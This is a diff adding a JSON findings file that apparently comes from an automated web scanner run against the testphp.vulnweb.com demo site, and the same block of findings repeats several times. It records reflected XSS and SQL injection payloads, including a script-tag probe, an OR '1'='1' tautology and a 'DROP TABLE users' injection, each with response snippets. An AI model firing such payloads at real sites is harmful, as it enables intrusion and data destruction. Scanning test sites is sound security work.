@@ -1,0 +1,290 @@
+[
+  {
+    "type": "xss-reflected",
+    "target": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "payload": "<script>penai_xss</script>",
+    "method": "post",
+    "proof_used_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "confidence": "high",
+    "snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable"
+  },
+  {
+    "type": "sqli-error",
+    "target": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "payload": "' OR '1'='1' -- ",
+    "method": "post",
+    "evidence": "SQL syntax",
+    "proof_used_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "confidence": "high",
+    "snippet": "<!doctype html public \"-//w3c//dtd html 4.01 transitional//en\"\n\"http://www.w3.org/tr/html4/loose.dtd\">\n<html><!-- instancebegin template=\"/templates/main_dynamic_template.dwt.php\" codeoutsidehtmlislocked=\"false\" -->\n<head>\n<meta http-equiv=\"content-type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- instancebegineditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- instanceendeditable"
+  },
+  {
+    "type": "sqli-error",
+    "target": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "payload": "'; DROP TABLE users; --",
+    "method": "post",
+    "evidence": "SQL syntax",
+    "proof_used_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "confidence": "high",
+    "snippet": "<!doctype html public \"-//w3c//dtd html 4.01 transitional//en\"\n\"http://www.w3.org/tr/html4/loose.dtd\">\n<html><!-- instancebegin template=\"/templates/main_dynamic_template.dwt.php\" codeoutsidehtmlislocked=\"false\" -->\n<head>\n<meta http-equiv=\"content-type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- instancebegineditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- instanceendeditable"
+  },
+  {
+    "type": "sqli-error",
+    "target": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "payload": "1' OR '1'='1' /*",
+    "method": "post",
+    "evidence": "SQL syntax",
+    "proof_used_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "confidence": "high",
+    "snippet": "<!doctype html public \"-//w3c//dtd html 4.01 transitional//en\"\n\"http://www.w3.org/tr/html4/loose.dtd\">\n<html><!-- instancebegin template=\"/templates/main_dynamic_template.dwt.php\" codeoutsidehtmlislocked=\"false\" -->\n<head>\n<meta http-equiv=\"content-type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- instancebegineditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- instanceendeditable"
+  },
+  {
+    "type": "xss-reflected",
+    "target": "http://testphp.vulnweb.com/search.php?test=query",
+    "method": "post",
+    "proof_used_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "confidence": "high",
+    "snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable"
+  },
+  {
+    "type": "xss-reflected",
+    "target": "http://testphp.vulnweb.com/guestbook.php",
+    "param": "name",
+    "payload": "<script>penai_xss</script>",
+    "method": "post",
+    "proof_used_url": "http://testphp.vulnweb.com/guestbook.php",
+    "confidence": "high",
+    "snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>guestbook</title>\n<!-- InstanceEndEdita"
+  },
+  {
+    "type": "xss-reflected",
+    "target": "http://testphp.vulnweb.com/guestbook.php",
+    "param": "text",
+    "payload": "<script>penai_xss</script>",
+    "method": "post",
+    "proof_used_url": "http://testphp.vulnweb.com/guestbook.php",
+    "confidence": "high",
+    "snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>guestbook</title>\n<!-- InstanceEndEdita"
+  },
+  {
+    "type": "xss-reflected",
+    "target": "http://testphp.vulnweb.com/guestbook.php",
+    "method": "post",
+    "proof_used_url": "http://testphp.vulnweb.com/guestbook.php",
+    "confidence": "high",
+    "snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>guestbook</title>\n<!-- InstanceEndEdita"
+  },
+  {
+    "type": "xss-reflected",
+    "target": "http://testphp.vulnweb.com/secured/newuser.php",
+    "method": "post",
+    "proof_used_url": "http://testphp.vulnweb.com/secured/newuser.php",
+    "confidence": "high",
+    "snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\r\n<html>\r\n<head>\r\n<title>add new user</title>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<link href=\"style.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body>\r\n<div id=\"masthead\"> \r\n  <h1 id=\"siteName\">ACUNETIX ART</h1> \r\n</div>\r\n<div id=\"content\">\r\n\t<p>You have"
+  },
+  {
+    "type": "sqli-error",
+    "target": "http://testphp.vulnweb.com/secured/newuser.php",
+    "method": "post",
+    "evidence": "SQL syntax",
+    "proof_used_url": "http://testphp.vulnweb.com/secured/newuser.php",
+    "confidence": "high",
+    "snippet": "<!doctype html public \"-//w3c//dtd html 4.01 transitional//en\" \"http://www.w3.org/tr/html4/loose.dtd\">\r\n<html>\r\n<head>\r\n<title>add new user</title>\r\n<meta http-equiv=\"content-type\" content=\"text/html; charset=iso-8859-1\">\r\n<link href=\"style.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body>\r\n<div id=\"masthead\"> \r\n  <h1 id=\"sitename\">acunetix art</h1> \r\n</div>\r\n<div id=\"content\">\r\n\tunable to a"
+  },
+  {
+    "type": "xss-reflected",
+    "target": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "payload": "<script>penai_xss</script>",
+    "method": "post",
+    "proof_used_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "confidence": "high",
+    "snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable"
+  },
+  {
+    "type": "sqli-error",
+    "target": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "payload": "' OR '1'='1' -- ",
+    "method": "post",
+    "evidence": "SQL syntax",
+    "proof_used_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "confidence": "high",
+    "snippet": "<!doctype html public \"-//w3c//dtd html 4.01 transitional//en\"\n\"http://www.w3.org/tr/html4/loose.dtd\">\n<html><!-- instancebegin template=\"/templates/main_dynamic_template.dwt.php\" codeoutsidehtmlislocked=\"false\" -->\n<head>\n<meta http-equiv=\"content-type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- instancebegineditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- instanceendeditable"
+  },
+  {
+    "type": "sqli-error",
+    "target": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "payload": "'; DROP TABLE users; --",
+    "method": "post",
+    "evidence": "SQL syntax",
+    "proof_used_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "confidence": "high",
+    "snippet": "<!doctype html public \"-//w3c//dtd html 4.01 transitional//en\"\n\"http://www.w3.org/tr/html4/loose.dtd\">\n<html><!-- instancebegin template=\"/templates/main_dynamic_template.dwt.php\" codeoutsidehtmlislocked=\"false\" -->\n<head>\n<meta http-equiv=\"content-type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- instancebegineditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- instanceendeditable"
+  },
+  {
+    "type": "sqli-error",
+    "target": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "payload": "1' OR '1'='1' /*",
+    "method": "post",
+    "evidence": "SQL syntax",
+    "proof_used_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "confidence": "high",
+    "snippet": "<!doctype html public \"-//w3c//dtd html 4.01 transitional//en\"\n\"http://www.w3.org/tr/html4/loose.dtd\">\n<html><!-- instancebegin template=\"/templates/main_dynamic_template.dwt.php\" codeoutsidehtmlislocked=\"false\" -->\n<head>\n<meta http-equiv=\"content-type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- instancebegineditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- instanceendeditable"
+  },
+  {
+    "type": "xss-reflected",
+    "target": "http://testphp.vulnweb.com/search.php?test=query",
+    "method": "post",
+    "proof_used_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "confidence": "high",
+    "snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable"
+  },
+  {
+    "type": "xss-reflected",
+    "target": "http://testphp.vulnweb.com/guestbook.php",
+    "param": "name",
+    "payload": "<script>penai_xss</script>",
+    "method": "post",
+    "proof_used_url": "http://testphp.vulnweb.com/guestbook.php",
+    "confidence": "high",
+    "snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>guestbook</title>\n<!-- InstanceEndEdita"
+  },
+  {
+    "type": "xss-reflected",
+    "target": "http://testphp.vulnweb.com/guestbook.php",
+    "param": "text",
+    "payload": "<script>penai_xss</script>",
+    "method": "post",
+    "proof_used_url": "http://testphp.vulnweb.com/guestbook.php",
+    "confidence": "high",
+    "snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>guestbook</title>\n<!-- InstanceEndEdita"
+  },
+  {
+    "type": "xss-reflected",
+    "target": "http://testphp.vulnweb.com/guestbook.php",
+    "method": "post",
+    "proof_used_url": "http://testphp.vulnweb.com/guestbook.php",
+    "confidence": "high",
+    "snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>guestbook</title>\n<!-- InstanceEndEdita"
+  },
+  {
+    "type": "xss-reflected",
+    "target": "http://testphp.vulnweb.com/secured/newuser.php",
+    "method": "post",
+    "proof_used_url": "http://testphp.vulnweb.com/secured/newuser.php",
+    "confidence": "high",
+    "snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\r\n<html>\r\n<head>\r\n<title>add new user</title>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<link href=\"style.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body>\r\n<div id=\"masthead\"> \r\n  <h1 id=\"siteName\">ACUNETIX ART</h1> \r\n</div>\r\n<div id=\"content\">\r\n\t<p>You have"
+  },
+  {
+    "type": "sqli-error",
+    "target": "http://testphp.vulnweb.com/secured/newuser.php",
+    "method": "post",
+    "evidence": "SQL syntax",
+    "proof_used_url": "http://testphp.vulnweb.com/secured/newuser.php",
+    "confidence": "high",
+    "snippet": "<!doctype html public \"-//w3c//dtd html 4.01 transitional//en\" \"http://www.w3.org/tr/html4/loose.dtd\">\r\n<html>\r\n<head>\r\n<title>add new user</title>\r\n<meta http-equiv=\"content-type\" content=\"text/html; charset=iso-8859-1\">\r\n<link href=\"style.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body>\r\n<div id=\"masthead\"> \r\n  <h1 id=\"sitename\">acunetix art</h1> \r\n</div>\r\n<div id=\"content\">\r\n\tunable to a"
+  },
+  {
+    "type": "xss-reflected",
+    "target": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "payload": "<script>penai_xss</script>",
+    "method": "post",
+    "proof_used_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "confidence": "high",
+    "snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable"
+  },
+  {
+    "type": "sqli-error",
+    "target": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "payload": "' OR '1'='1' -- ",
+    "method": "post",
+    "evidence": "SQL syntax",
+    "proof_used_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "confidence": "high",
+    "snippet": "<!doctype html public \"-//w3c//dtd html 4.01 transitional//en\"\n\"http://www.w3.org/tr/html4/loose.dtd\">\n<html><!-- instancebegin template=\"/templates/main_dynamic_template.dwt.php\" codeoutsidehtmlislocked=\"false\" -->\n<head>\n<meta http-equiv=\"content-type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- instancebegineditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- instanceendeditable"
+  },
+  {
+    "type": "sqli-error",
+    "target": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "payload": "'; DROP TABLE users; --",
+    "method": "post",
+    "evidence": "SQL syntax",
+    "proof_used_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "confidence": "high",
+    "snippet": "<!doctype html public \"-//w3c//dtd html 4.01 transitional//en\"\n\"http://www.w3.org/tr/html4/loose.dtd\">\n<html><!-- instancebegin template=\"/templates/main_dynamic_template.dwt.php\" codeoutsidehtmlislocked=\"false\" -->\n<head>\n<meta http-equiv=\"content-type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- instancebegineditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- instanceendeditable"
+  },
+  {
+    "type": "sqli-error",
+    "target": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "payload": "1' OR '1'='1' /*",
+    "method": "post",
+    "evidence": "SQL syntax",
+    "proof_used_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "confidence": "high",
+    "snippet": "<!doctype html public \"-//w3c//dtd html 4.01 transitional//en\"\n\"http://www.w3.org/tr/html4/loose.dtd\">\n<html><!-- instancebegin template=\"/templates/main_dynamic_template.dwt.php\" codeoutsidehtmlislocked=\"false\" -->\n<head>\n<meta http-equiv=\"content-type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- instancebegineditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- instanceendeditable"
+  },
+  {
+    "type": "xss-reflected",
+    "target": "http://testphp.vulnweb.com/search.php?test=query",
+    "method": "post",
+    "proof_used_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "confidence": "high",
+    "snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable"
+  },
+  {
+    "type": "xss-reflected",
+    "target": "http://testphp.vulnweb.com/guestbook.php",
+    "param": "name",
+    "payload": "<script>penai_xss</script>",
+    "method": "post",
+    "proof_used_url": "http://testphp.vulnweb.com/guestbook.php",
+    "confidence": "high",
+    "snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>guestbook</title>\n<!-- InstanceEndEdita"
+  },
+  {
+    "type": "xss-reflected",
+    "target": "http://testphp.vulnweb.com/guestbook.php",
+    "param": "text",
+    "payload": "<script>penai_xss</script>",
+    "method": "post",
+    "proof_used_url": "http://testphp.vulnweb.com/guestbook.php",
+    "confidence": "high",
+    "snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>guestbook</title>\n<!-- InstanceEndEdita"
+  },
+  {
+    "type": "xss-reflected",
+    "target": "http://testphp.vulnweb.com/guestbook.php",
+    "method": "post",
+    "proof_used_url": "http://testphp.vulnweb.com/guestbook.php",
+    "confidence": "high",
+    "snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>guestbook</title>\n<!-- InstanceEndEdita"
+  },
+  {
+    "type": "xss-reflected",
+    "target": "http://testphp.vulnweb.com/secured/newuser.php",
+    "method": "post",
+    "proof_used_url": "http://testphp.vulnweb.com/secured/newuser.php",
+    "confidence": "high",
+    "snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\r\n<html>\r\n<head>\r\n<title>add new user</title>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<link href=\"style.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body>\r\n<div id=\"masthead\"> \r\n  <h1 id=\"siteName\">ACUNETIX ART</h1> \r\n</div>\r\n<div id=\"content\">\r\n\t<p>You have"
+  },
+  {
+    "type": "sqli-error",
+    "target": "http://testphp.vulnweb.com/secured/newuser.php",
+    "method": "post",
+    "evidence": "SQL syntax",
+    "proof_used_url": "http://testphp.vulnweb.com/secured/newuser.php",
+    "confidence": "high",
+    "snippet": "<!doctype html public \"-//w3c//dtd html 4.01 transitional//en\" \"http://www.w3.org/tr/html4/loose.dtd\">\r\n<html>\r\n<head>\r\n<title>add new user</title>\r\n<meta http-equiv=\"content-type\" content=\"text/html; charset=iso-8859-1\">\r\n<link href=\"style.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body>\r\n<div id=\"masthead\"> \r\n  <h1 id=\"sitename\">acunetix art</h1> \r\n</div>\r\n<div id=\"content\">\r\n\tunable to a"
+  }
+]
